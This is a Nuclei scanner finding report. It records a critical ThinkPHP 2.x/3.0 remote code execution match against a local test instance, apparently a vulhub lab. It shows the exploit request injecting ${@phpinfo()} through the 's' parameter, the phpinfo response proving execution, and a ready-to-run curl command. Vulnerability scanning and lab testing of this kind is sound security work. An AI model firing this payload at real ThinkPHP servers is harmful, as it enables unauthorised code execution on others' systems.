### ThinkPHP 2 / 3 's' Parameter RCE (thinkphp-2-rce) found on http://127.0.0.1:8080/
---
**Details**: **thinkphp-2-rce**  matched at http://127.0.0.1:8080/

**Protocol**: HTTP

**Full URL**: http://127.0.0.1:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D

**Timestamp**: Wed Jan 12 18:07:24 +0800 CST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | ThinkPHP 2 / 3 's' Parameter RCE |
| Authors | dr_set |
| Tags | thinkphp, rce |
| Severity | critical |
| Description | ThinkPHP 2.x version and 3.0 in Lite mode Remote Code Execution. |

**Request**

```http
GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**

```http
HTTP/1.1 200 OK
Connection: close
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Content-Type: text/html
Date: Wed, 12 Jan 2022 10:07:24 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=cb565cb38a01bd65134b38157c735fb6; path=/
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.38

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #ffffff; color: #000000;}
body, td, th, h1, h2 {font-family: sans-serif;}
pre {margin: 0px; font-family: monospace;}
a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse;}
.center {text-align: center;}
.center table { margin-left: auto; margin-right: auto; text-align: left;}
.center th { text-align: center !important; }
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccccff; font-weight: bold; color: #000000;}
.h {background-color: #9999cc; font-weight: bold; color: #000000;}
.v {background-color: #cccccc; color: #000000;}
.vr {background-color: #cccccc; text-align: right; color: #000000;}
img {float: right; border: 0px;}
hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
</style>
<title>phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
<body><div class="center">
<table border="0" cellpadding="3" width="600">
<tr class="h"><td>
<a href="http://www.php.net/"><img border="0" src="data:image/gif;base64,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.... Truncated ....
```

References: 
- https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'http://127.0.0.1:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D'
```
---
Generated by [Nuclei 2.5.7](https://github.com/projectdiscovery/nuclei)